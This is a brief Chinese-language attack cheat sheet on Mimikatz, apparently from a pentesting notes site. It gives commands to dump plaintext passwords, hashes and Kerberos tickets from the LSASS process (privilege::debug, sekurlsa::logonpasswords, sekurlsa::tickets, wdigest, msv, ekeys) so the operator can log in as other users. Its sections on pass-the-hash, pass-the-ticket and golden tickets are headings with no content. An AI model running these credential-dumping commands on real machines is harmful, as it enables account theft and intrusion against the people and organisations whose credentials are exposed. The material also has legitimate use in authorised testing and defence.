---
description: 凭证提取、哈希传递、票据伪造、哈希注入、NTLM中继
---

# ✔️ Mimikatz

## Tips

* 可从机器内存中提取：
  * 明文密码
  * 密码Hash值
  * PIN码
  * Kerberos票据

## 攻击手法

### 检索已缓存凭证

* 从LSASS进程中转储其他用户凭证，然后以这些用户身份进行登录：

```powershell
mimikatz.exe
# 提权以执行高权限操作
privilege::debug
# 枚举所有登录用户的凭证
sekurlsa::logonpasswords
```

* 同理，从LSASS进程中转储所有Kerberos票据：

```powershell
sekurlsa::tickets
```

* 其他：

```powershell
# 只抓取内存中保存的用户明文密码
sekurlsa::wdigest
# 只抓取内存中保存的用户Hash值
sekurlsa::msv
# 只抓取内存中保存的用户密码的Key值
sekurlsa::ekeys
```

### 哈希传递 (Pass The Hash)





### 票据传递 (Pass The Ticket)







### 绕过哈希 (Overpass The Hash)





### 黄金票据 (Golden Ticket)





